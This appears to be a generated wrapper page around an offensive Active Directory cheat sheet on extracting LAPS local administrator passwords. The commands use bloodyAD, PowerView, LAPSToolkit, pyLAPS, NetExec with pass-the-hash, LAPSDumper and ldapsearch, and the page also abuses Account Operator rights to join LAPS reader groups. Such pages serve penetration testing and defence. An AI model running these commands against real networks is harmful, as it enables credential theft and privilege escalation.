---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - LAPS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-read-laps` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-laps.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - LAPS](../../topics/active-directory/password-laps.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-read-laps |
| name | Password - LAPS |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-read-laps.md |

## Preserved Source Material

````yaml
_body: "# Password - LAPS\n\n## Reading LAPS Password\n\n> Use LAPS to automatically manage local administrator passwords\
  \ on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored\
  \ in Active Directory infrastructure.\n\n### Determine if LAPS is installed\n\n```ps1\nGet-ChildItem 'c:\\program files\\\
  LAPS\\CSE\\Admpwd.dll'\nGet-FileHash 'c:\\program files\\LAPS\\CSE\\Admpwd.dll'\nGet-AuthenticodeSignature 'c:\\program\
  \ files\\LAPS\\CSE\\Admpwd.dll'\n```\n\n### Extract LAPS password\n\n> The \"ms-mcs-AdmPwd\" a \"confidential\" computer\
  \ attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default,\
  \ and unlike other attributes, is not accessible by Authenticated Users\n\n- Windows/Linux:\n\n    ```ps1\n    bloodyAD\
  \ -u john.doe -d bloody.lab -p Password512 --host 192.168.10.2 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr\
  \ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime\n    ```\n\n- From Windows:\n\n    - adsisearcher (native binary on Windows\
  \ 8+)\n\n       ```powershell\n       ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))\"\
  ).findAll() | ForEach-Object { $_.properties}\n       ([adsisearcher]\"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))\"\
  ).findAll() | ForEach-Object { $_.properties}\n       ```\n\n    - [PowerTools/PowerView](https://github.com/PowerShellEmpire/PowerTools)\n\
  \n       ```powershell\n       PS > Import-Module .\\PowerView.ps1\n       PS > Get-DomainComputer COMPUTER -Properties\
  \ ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime\n       ```\n\n    - [leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)\n\
  \n       ```powershell\n       $ Get-LAPSComputers\n       ComputerName                Password                        \
  \         Expiration         \n       ------------                --------                                 ----------  \
  \       \n       example.domain.local        dbZu7;vGaI)Y6w1L                         02/21/2021 22:29:18\n\n       $ Find-LAPSDelegatedGroups\n\
  \       $ Find-AdmPwdExtendedRights\n       ```\n\n    - Powershell AdmPwd.PS\n\n       ```powershell\n       foreach ($objResult\
  \ in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object\
  \ {Get-AdmPwdPassword -ComputerName $_}}}\n       ```\n\n- From Linux:\n\n    - [p0dalirius/pyLAPS](https://github.com/p0dalirius/pyLAPS)\
  \ to **read** and **write** LAPS passwords:\n\n       ```bash\n       # Read the password of all computers\n       ./pyLAPS.py\
  \ --action get -u 'Administrator' -d 'LAB.local' -p 'Admin123!' --dc-ip 192.168.2.1\n       # Write a random password to\
  \ a specific computer\n       ./pyLAPS.py --action set --computer 'PC01$' -u 'Administrator' -d 'LAB.local' -p 'Admin123!'\
  \ --dc-ip 192.168.2.1\n       ```\n\n    - [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec):\n\n       ```bash\n\
  \       netexec ldap 10.10.10.10 -u 'user' -H '8846f7eaee8fb117ad06bdd830b7586c' -M laps\n       ```\n\n    - [n00py/LAPSDumper](https://github.com/n00py/LAPSDumper)\n\
  \n       ```bash\n       python laps.py -u 'user' -p 'password' -d 'domain.local'\n       python laps.py -u 'user' -p 'e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c'\
  \ -d 'domain.local' -l 'dc01.domain.local'\n       ```\n\n    - ldapsearch\n\n      ```bash\n      ldapsearch -x -h  -D\
  \ \"<bind user>\" -w  -b \"dc=<>,dc=<>,dc=<>\" \"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))\" ms-MCS-AdmPwd\n      ```\n\
  \n### Grant LAPS Access\n\nThe members of the group **\"Account Operator\"** can add and modify all the non admin users\
  \ and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them,\
  \ and read the LAPS admin password\n\n```ps1\nAdd-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred\
  \ -Domain \"domain.local\"\nAdd-DomainGroupMember -Identity 'LAPS READ' -Members 'user1' -Credential $cred -Domain \"domain.local\"\
  \n```\n\n## References\n\n- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)"
_relative_path: active-directory/pwd-read-laps.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-read-laps.md
````
